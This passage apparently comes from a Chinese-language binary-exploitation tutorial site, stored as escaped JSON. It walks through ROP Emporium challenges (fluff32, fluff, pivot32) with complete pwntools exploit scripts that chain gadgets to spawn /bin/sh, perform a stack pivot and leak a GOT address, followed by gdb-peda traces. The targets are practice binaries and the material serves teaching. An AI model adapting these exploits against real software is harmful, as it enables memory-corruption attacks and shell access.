l32(xor_edx_edx)\n    payload += \"BBBB\"\n    payload += l32(pop_ebx)\n    payload += l32(addr)\n    payload += l32(xor_edx_ebx)\n    payload += \"BBBB\"\n    payload += l32(xchg_edx_ecx)\n    payload += \"BBBB\"\n\n    # data -&gt; edx\n    payload += l32(xor_edx_edx)\n    payload += \"BBBB\"\n    payload += l32(pop_ebx)\n    payload += data\n    payload += l32(xor_edx_ebx)\n    payload += \"BBBB\"\n\n    # edx -&gt; [ecx]\n    payload += l32(mov_ecx_edx)\n    payload += \"BBBB\"\n    payload += l32(0)\n\n    return payload\n\npayload  = \"A\"*44\n\npayload += write_data(\"/bin\", data_addr)\npayload += write_data(\"/sh\\x00\", data_addr + 4)\n\npayload += l32(system_plt)\npayload += \"BBBB\"\npayload += l32(data_addr)\n\nio = zio('./fluff32')\nio.writeline(payload)\nio.interact()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#fluff","title":"fluff","text":"<p>\u63d0\u793a\uff1a\u5728\u4f7f\u7528 ropgadget \u641c\u7d22\u65f6\u52a0\u4e0a\u53c2\u6570 <code>--depth</code> \u53ef\u4ee5\u5f97\u5230\u66f4\u5927\u957f\u5ea6\u7684 gadgets\u3002</p> <pre><code>$ ropgadget --binary fluff --only \"mov|pop|ret|xor|xchg\" --depth 20\n...\n0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret\n0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret\n0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret\n0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret\n0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret\nfrom pwn import *\n\nsystem_plt = 0x004005e0\ndata_addr  = 0x0000000000601050\n\nxor_r11_r11 = 0x0000000000400822\nxor_r11_r12 = 0x000000000040082f\nxchg_r11_r10 = 0x0000000000400840\nmov_r10_r11 = 0x000000000040084c\npop_r12 = 0x0000000000400832\n\ndef write_data(data, addr):\n    # addr -&gt; r10\n    payload  = p64(xor_r11_r11)\n    payload += \"BBBBBBBB\"\n    payload += p64(pop_r12)\n    payload += p64(addr)\n    payload += p64(xor_r11_r12)\n    payload += \"BBBBBBBB\"\n    payload += p64(xchg_r11_r10)\n    payload += \"BBBBBBBB\"\n\n    # data -&gt; r11\n    payload += p64(xor_r11_r11)\n    payload += \"BBBBBBBB\"\n    payload += p64(pop_r12)\n    payload += data\n    payload += p64(xor_r11_r12)\n    payload += \"BBBBBBBB\"\n\n    # r11 -&gt; [r10]\n    payload += p64(mov_r10_r11)\n    payload += \"BBBBBBBB\"*2\n    payload += p64(0)\n\n    return payload\n\npayload  = \"A\"*40\npayload += write_data(\"/bin/sh\\x00\", data_addr)\npayload += p64(system_plt)\n\nio = process('./fluff')\nio.recvuntil('&gt;')\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#pivot32","title":"pivot32","text":"<p>\u8fd9\u662f\u6311\u6218\u7684\u6700\u540e\u4e00\u9898\uff0c\u96be\u5ea6\u7a81\u7136\u589e\u52a0\u3002\u9996\u5148\u662f\u52a8\u6001\u5e93\uff0c\u52a8\u6001\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4e00\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u76f8\u5bf9\u4f4d\u7f6e\u5173\u7cfb\u5f97\u5230\u5176\u4ed6\u4efb\u610f\u51fd\u6570\u7684\u5730\u5740\u3002\u5728\u5f00\u542f ASLR \u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u5e93\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u53d8\u5316\u7684\uff0c\u4f46\u5e76\u4e0d\u5f71\u54cd\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u5148\u6cc4\u9732\u51fa\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5f97\u5230\u76ee\u6807\u51fd\u6570\u5730\u5740\u3002</p> <p>\u901a\u8fc7\u5206\u6790\u6211\u4eec\u77e5\u9053\u8be5\u7a0b\u5e8f\u4ece\u52a8\u6001\u5e93 <code>libpivot32.so</code> \u4e2d\u5bfc\u5165\u4e86\u51fd\u6570 <code>foothold_function()</code>\uff0c\u4f46\u5728\u7a0b\u5e8f\u903b\u8f91\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\uff0c\u800c\u5728 <code>libpivot32.so</code> \u4e2d\u8fd8\u6709\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570 <code>ret2win()</code>\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86\u53ef\u4ee5\u6cc4\u9732\u7684\u51fd\u6570 <code>foothold_function()</code>\uff0c\u90a3\u4e48\u600e\u4e48\u6cc4\u9732\u5462\u3002\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u7b80\u5355\u4ecb\u7ecd\u4e86\u5ef6\u65f6\u7ed1\u5b9a\u6280\u672f\uff0c\u5f53\u6211\u4eec\u5728\u8c03\u7528\u5982 <code>func@plt()</code> \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5c06\u771f\u6b63\u7684 <code>func()</code> \u51fd\u6570\u5730\u5740\u5199\u5165\u5230 GOT \u8868\u7684 <code>func.got.plt</code> \u4e2d\uff0c\u7136\u540e <code>func@plt()</code> \u6839\u636e <code>func.got.plt</code> \u8df3\u8f6c\u5230\u771f\u6b63\u7684 <code>func()</code> \u51fd\u6570\u4e0a\u53bb\u3002</p> <p>\u6700\u540e\u662f\u8be5\u6311\u6218\u6700\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7a0b\u5e8f\u8fd0\u884c\u6211\u4eec\u6709\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u5165\u88ab\u653e\u5728\u4e00\u4e2a\u7531 <code>malloc()</code> \u51fd\u6570\u5206\u914d\u7684\u5806\u4e0a\uff0c\u5f53\u7136\u4e3a\u4e86\u964d\u4f4e\u96be\u5ea6\uff0c\u7a0b\u5e8f\u7279\u5730\u5c06\u8be5\u5730\u5740\u6253\u5370\u4e86\u51fa\u6765\uff0c\u7b2c\u4e8c\u6b21\u7684\u8f93\u5165\u5219\u88ab\u653e\u5728\u4e00\u4e2a\u5927\u5c0f\u9650\u5236\u4e3a 13 \u5b57\u8282\u7684\u6808\u4e0a\uff0c\u8fd9\u4e2a\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u8ba9\u6211\u4eec\u6267\u884c\u5f88\u591a\u4e1c\u897f\uff0c\u6240\u4ee5\u9700\u8981\u8fd0\u7528 stack pivot\uff0c\u5373\u901a\u8fc7\u8986\u76d6\u8c03\u7528\u8005\u7684 ebp\uff0c\u5c06\u6808\u5e27\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u5730\u65b9\uff0c\u540c\u65f6\u63a7\u5236 eip\uff0c\u5373\u53ef\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\uff0c\u901a\u5e38\u7684 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u526fpayload\uff09 \u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>buffer padding | fake ebp | leave;ret addr |\n</code></pre> <p>\u8fd9\u6837\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5c31\u88ab\u8986\u76d6\u4e3a leave;ret \u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u6837\u7a0b\u5e8f\u5728\u6267\u884c\u5b8c\u5176\u539f\u672c\u7684 leave;ret \u540e\uff0c\u53c8\u6267\u884c\u4e86\u4e00\u6b21 leave;ret\u3002</p> <p>\u53e6\u5916 fake ebp \u6307\u5411\u6211\u4eec\u53e6\u4e00\u6bb5 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u4e3bpayload\uff09 \u7684 ebp\uff0c\u5373 \u4e3bpayload \u5730\u5740\u51cf 4 \u7684\u5730\u65b9\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5728\u6784\u9020 \u4e3bpayload \u65f6\u5728\u524d\u9762\u52a0 4 \u4e2a\u5b57\u8282\u7684 padding \u4f5c\u4e3a ebp\uff1a</p> <pre><code>ebp | payload\n</code></pre> <p>\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u51fd\u6570\u7684\u5165\u53e3\u70b9\u901a\u5e38\u662f\uff1a</p> <pre><code>push ebp\nmov  ebp,esp\n</code></pre> <p>leave \u6307\u4ee4\u76f8\u5f53\u4e8e\uff1a</p> <pre><code>mov esp,ebp\npop ebp\n</code></pre> <p>ret \u6307\u4ee4\u4e3a\u76f8\u5f53\u4e8e\uff1a</p> <pre><code>pop eip\n</code></pre> <p>\u5982\u679c\u9047\u5230\u4e00\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u6bd4\u8f83\u5c0f\uff0c\u4e0d\u80fd\u5b8c\u6210\u5168\u90e8\u7684\u5de5\u4f5c\uff0c\u540c\u65f6\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u6216\u8005\u7cfb\u7edf\u5f00\u542f\u4e86 ASLR\uff0c\u4f46\u540c\u65f6\u5728\u7a0b\u5e8f\u7684\u53e6\u4e00\u4e2a\u5730\u65b9\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u53ef\u4ee5\u5199\u5165 payload\uff0c\u5e76\u4e14\u53ef\u6267\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06\u6808\u8f6c\u79fb\u5230\u90a3\u4e2a\u5730\u65b9\u53bb\u3002</p> <p>\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\n\n#context.log_level = 'debug'\n#context.terminal = ['konsole']\nio = process('./pivot32')\nelf = ELF('./pivot32')\nlibp = ELF('./libpivot32.so')\n\nleave_ret = 0x0804889f\n\nfoothold_plt     = elf.plt['foothold_function'] # 0x080485f0\nfoothold_got_plt = elf.got['foothold_function'] # 0x0804a024\n\npop_eax      = 0x080488c0\npop_ebx      = 0x08048571\nmov_eax_eax  = 0x080488c4\nadd_eax_ebx  = 0x080488c7\ncall_eax     = 0x080486a3\n\nfoothold_sym = libp.symbols['foothold_function']\nret2win_sym  = libp.symbols['ret2win']\noffset = int(ret2win_sym - foothold_sym) # 0x1f7\n\nleakaddr  = int(io.recv().split()[20], 16)\n\n# calls foothold_function() to populate its GOT entry, then queries that value into EAX\n#gdb.attach(io)\npayload_1  = p32(foothold_plt)\npayload_1 += p32(pop_eax)\npayload_1 += p32(foothold_got_plt)\npayload_1 += p32(mov_eax_eax)\npayload_1 += p32(pop_ebx)\npayload_1 += p32(offset)\npayload_1 += p32(add_eax_ebx)\npayload_1 += p32(call_eax)\n\nio.sendline(payload_1)\n\n# ebp = leakaddr-4, esp = leave_ret\npayload_2  = \"A\"*40\npayload_2 += p32(leakaddr-4) + p32(leave_ret)\n\nio.sendline(payload_2)\nprint io.recvall()\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5728 gdb \u4e2d\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5728 pwnme() \u51fd\u6570\u7684 leave \u5904\u4e0b\u65ad\u70b9\uff1a</p> <pre><code>gdb-peda$ b *0x0804889f\nBreakpoint 1 at 0x804889f\ngdb-peda$ c\nContinuing.\n[----------------------------------registers-----------------------------------]\nEAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEBX: 0x0\nECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEDX: 0xf7731860 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0xffe7ec68 --&gt; 0xf755cf0c --&gt; 0x0\nESP: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEIP: 0x804889f (&lt;pwnme+173&gt;:    leave)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048896 &lt;pwnme+164&gt;:       call   0x80485b0 &lt;fgets@plt&gt;\n   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10\n   0x804889e &lt;pwnme+172&gt;:       nop\n=&gt; 0x804889f &lt;pwnme+173&gt;:       leave  \n   0x80488a0 &lt;pwnme+174&gt;:       ret\n   0x80488a1 &lt;uselessFunction&gt;: push   ebp\n   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp\n   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8\n[------------------------------------stack-------------------------------------]\n0000| 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0004| 0xffe7ec44 ('A' &lt;repeats 36 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0008| 0xffe7ec48 ('A' &lt;repeats 32 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0012| 0xffe7ec4c ('A' &lt;repeats 28 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0016| 0xffe7ec50 ('A' &lt;repeats 24 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0020| 0xffe7ec54 ('A' &lt;repeats 20 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0024| 0xffe7ec58 ('A' &lt;repeats 16 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n0028| 0xffe7ec5c ('A' &lt;repeats 12 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x0804889f in pwnme ()\ngdb-peda$ x/10w 0xffe7ec68\n0xffe7ec68:     0xf755cf0c      0x0804889f      0xf755000a      0x00000000\n0xffe7ec78:     0x00000002      0x00000000      0x00000001      0xffe7ed44\n0xffe7ec88:     0xf755cf10      0xf655d010\ngdb-peda$ x/10w 0xf755cf0c\n0xf755cf0c:     0x00000000      0x080485f0      0x080488c0      0x0804a024\n0xf755cf1c:     0x080488c4      0x08048571      0x000001f7      0x080488c7\n0xf755cf2c:     0x080486a3      0x0000000a\n</code></pre> <p>\u6267\u884c\u7b2c\u4e00\u6b21 leave;ret \u4e4b\u524d\uff0c\u6211\u4eec\u770b\u5230 EBP \u6307\u5411 fake ebp\uff0c\u5373 <code>0xf755cf0c</code>\uff0cfake ebp \u6307\u5411 \u4e3bpayload \u7684 ebp\uff0c\u800c\u5728 fake ebp \u540e\u9762\u662f leave;ret \u7684\u5730\u5740 <code>0x0804889f</code>\uff0c\u5373\u8fd4\u56de\u5730\u5740\u3002</p> <p>\u6267\u884c\u7b2c\u4e00\u6b21 leave\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEBX: 0x0\nECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEDX: 0xf7731860 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0xf755cf0c --&gt; 0x0\nESP: 0xffe7ec6c --&gt; 0x804889f (&lt;pwnme+173&gt;:     leave)\nEIP: 0x80488a0 (&lt;pwnme+174&gt;:    ret)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10\n   0x804889e &lt;pwnme+172&gt;:       nop\n   0x804889f &lt;pwnme+173&gt;:       leave  \n=&gt; 0x80488a0 &lt;pwnme+174&gt;:       ret\n   0x80488a1 &lt;uselessFunction&gt;: push   ebp\n   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp\n   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8\n   0x80488a7 &lt;uselessFunction+6&gt;:       call   0x80485f0 &lt;foothold_function@plt&gt;\n[------------------------------------stack-------------------------------------]\n0000| 0xffe7ec6c --&gt; 0x804889f (&lt;pwnme+173&gt;:    leave)\n0004| 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0\n0008| 0xffe7ec74 --&gt; 0x0\n0012| 0xffe7ec78 --&gt; 0x2\n0016| 0xffe7ec7c --&gt; 0x0\n0020| 0xffe7ec80 --&gt; 0x1\n0024| 0xffe7ec84 --&gt; 0xffe7ed44 --&gt; 0xffe808cf (\"./pivot32\")\n0028| 0xffe7ec88 --&gt; 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488a0 in pwnme ()\n</code></pre> <p>EBP \u7684\u503c <code>0xffe7ec68</code> \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u7136\u540e\u4ece\u6808\u4e2d\u5f39\u51fa <code>0xf755cf0c</code>\uff0c\u5373 fake ebp \u5e76\u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4=<code>0xffe7ec6c</code>\uff0c\u6307\u5411\u7b2c\u4e8c\u6b21\u7684 leave\u3002</p> <p>\u6267\u884c\u7b2c\u4e00\u6b21 ret\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEBX: 0x0\nECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEDX: 0xf7731860 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0xf755cf0c --&gt; 0x0\nESP: 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0\nEIP: 0x804889f (&lt;pwnme+173&gt;:    leave)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048896 &lt;pwnme+164&gt;:       call   0x80485b0 &lt;fgets@plt&gt;\n   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10\n   0x804889e &lt;pwnme+172&gt;:       nop\n=&gt; 0x804889f &lt;pwnme+173&gt;:       leave  \n   0x80488a0 &lt;pwnme+174&gt;:       ret\n   0x80488a1 &lt;uselessFunction&gt;: push   ebp\n   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp\n   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8\n[------------------------------------stack-------------------------------------]\n0000| 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0\n0004| 0xffe7ec74 --&gt; 0x0\n0008| 0xffe7ec78 --&gt; 0x2\n0012| 0xffe7ec7c --&gt; 0x0\n0016| 0xffe7ec80 --&gt; 0x1\n0020| 0xffe7ec84 --&gt; 0xffe7ed44 --&gt; 0xffe808cf (\"./pivot32\")\n0024| 0xffe7ec88 --&gt; 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)\n0028| 0xffe7ec8c --&gt; 0xf655d010 --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x0804889f in pwnme ()\n</code></pre> <p>EIP=<code>0x804889f</code>\uff0c\u540c\u65f6 ESP+4\u3002</p> <p>\u7b2c\u4e8c\u6b21 leave\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEBX: 0x0\nECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEDX: 0xf7731860 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)\nEIP: 0x80488a0 (&lt;pwnme+174&gt;:    ret)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10\n   0x804889e &lt;pwnme+172&gt;:       nop\n   0x804889f &lt;pwnme+173&gt;:       leave  \n=&gt; 0x80488a0 &lt;pwnme+174&gt;:       ret\n   0x80488a1 &lt;uselessFunction&gt;: push   ebp\n   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp\n   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8\n   0x80488a7 &lt;uselessFunction+6&gt;:       call   0x80485f0 &lt;foothold_function@plt&gt;\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;:        jmp    DWORD PTR ds:0x804a024)\n0004| 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)\n0008| 0xf755cf18 --&gt; 0x804a024 --&gt; 0x80485f6 (&lt;foothold_function@plt+6&gt;:        push   0x30)\n0012| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])\n0016| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0020| 0xf755cf24 --&gt; 0x1f7\n0024| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0028| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488a0 in pwnme ()\ngdb-peda$ x/10w 0xf755cf10\n0xf755cf10:     0x080485f0      0x080488c0      0x0804a024      0x080488c4\n0xf755cf20:     0x08048571      0x000001f7      0x080488c7      0x080486a3\n0xf755cf30:     0x0000000a      0x00000000\n</code></pre> <p>EBP \u7684\u503c <code>0xf755cf0c</code> \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u5e76\u5c06 \u4e3bpayload \u7684 ebp \u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4=<code>0xf755cf10</code>\uff0c\u8fd9\u4e2a\u503c\u6b63\u662f\u6211\u4eec \u4e3bpayload \u7684\u5730\u5740\u3002</p> <p>\u7b2c\u4e8c\u6b21 ret\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEBX: 0x0\nECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, \"\\f\\317U\\367\\237\\210\\004\\b\\n\")\nEDX: 0xf7731860 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;: pop    eax)\nEIP: 0x80485f0 (&lt;foothold_function@plt&gt;:        jmp    DWORD PTR ds:0x804a024)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80485e0 &lt;exit@plt&gt;:        jmp    DWORD PTR ds:0x804a020\n   0x80485e6 &lt;exit@plt+6&gt;:      push   0x28\n   0x80485eb &lt;exit@plt+11&gt;:     jmp    0x8048580\n=&gt; 0x80485f0 &lt;foothold_function@plt&gt;:   jmp    DWORD PTR ds:0x804a024\n | 0x80485f6 &lt;foothold_function@plt+6&gt;: push   0x30\n | 0x80485fb &lt;foothold_function@plt+11&gt;:        jmp    0x8048580\n | 0x8048600 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a028\n | 0x8048606 &lt;__libc_start_main@plt+6&gt;: push   0x38\n |-&gt;   0x80485f6 &lt;foothold_function@plt+6&gt;:     push   0x30\n       0x80485fb &lt;foothold_function@plt+11&gt;:    jmp    0x8048580\n       0x8048600 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a028\n       0x8048606 &lt;__libc_start_main@plt+6&gt;:     push   0x38\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)\n0004| 0xf755cf18 --&gt; 0x804a024 --&gt; 0x80485f6 (&lt;foothold_function@plt+6&gt;:        push   0x30)\n0008| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])\n0012| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0016| 0xf755cf24 --&gt; 0x1f7\n0020| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0024| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n0028| 0xf755cf30 --&gt; 0xa ('\\n')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080485f0 in foothold_function@plt ()\n</code></pre> <p>\u6210\u529f\u8df3\u8f6c\u5230 <code>foothold_function@plt</code>\uff0c\u63a5\u4e0b\u6765\u7cfb\u7edf\u901a\u8fc7 <code>_dl_runtime_resolve</code> \u7b49\u6b65\u9aa4\uff0c\u5c06\u771f\u6b63\u7684\u5730\u5740\u5199\u5165\u5230 <code>.got.plt</code> \u4e2d\uff0c\u6211\u4eec\u6784\u9020 gadget \u6cc4\u9732\u51fa\u8be5\u5730\u5740\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u51fa <code>ret2win()</code> \u7684\u5730\u5740\uff0c\u8c03\u7528\u5b83\uff0c\u5c31\u6210\u529f\u4e86\u3002</p> <p>\u5730\u5740\u6cc4\u9732\u7684\u8fc7\u7a0b\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0x54 ('T')\nEBX: 0x0\nECX: 0x54 ('T')\nEDX: 0xf7731854 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf18 --&gt; 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:      push   ebp)\nEIP: 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80488ba:   xchg   ax,ax\n   0x80488bc:   xchg   ax,ax\n   0x80488be:   xchg   ax,ax\n=&gt; 0x80488c0 &lt;usefulGadgets&gt;:   pop    eax\n   0x80488c1 &lt;usefulGadgets+1&gt;: ret\n   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax\n   0x80488c3 &lt;usefulGadgets+3&gt;: ret\n   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf18 --&gt; 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)\n0004| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])\n0008| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0012| 0xf755cf24 --&gt; 0x1f7\n0016| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0020| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n0024| 0xf755cf30 --&gt; 0xa ('\\n')\n0028| 0xf755cf34 --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488c0 in usefulGadgets ()\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)\nEBX: 0x0\nECX: 0x54 ('T')\nEDX: 0xf7731854 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:       mov    eax,DWORD PTR [eax])\nEIP: 0x80488c1 (&lt;usefulGadgets+1&gt;:      ret)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80488bc:   xchg   ax,ax\n   0x80488be:   xchg   ax,ax\n   0x80488c0 &lt;usefulGadgets&gt;:   pop    eax\n=&gt; 0x80488c1 